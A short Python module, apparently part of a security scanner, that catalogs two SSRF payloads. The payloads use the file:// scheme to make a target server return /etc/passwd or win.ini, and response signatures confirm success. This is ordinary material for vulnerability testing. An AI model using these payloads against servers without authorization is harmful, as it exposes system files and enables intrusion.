"""SSRF 페이로드 카탈로그 — 최소 핵심.

대상 서버에 `file://` 스킴 처리를 시켜 시스템 파일을 회수하는 두 변형만 둔다.
필요한 환경에서만 별도로 페이로드를 추가해 사용한다.
"""
from __future__ import annotations

from dataclasses import dataclass

from common.result import Confidence


@dataclass(frozen=True)
class SSRFPayload:
    value: str
    category: str
    signatures: tuple[bytes, ...]
    confidence: Confidence


PAYLOADS: tuple[SSRFPayload, ...] = (
    SSRFPayload(
        value="file:///etc/passwd",
        category="scheme-file-nix",
        signatures=(b"root:x:0:0",),
        confidence=Confidence.HIGH,
    ),
    SSRFPayload(
        value="file:///c:/windows/win.ini",
        category="scheme-file-windows",
        signatures=(b"[fonts]", b"[extensions]"),
        confidence=Confidence.HIGH,
    ),
)
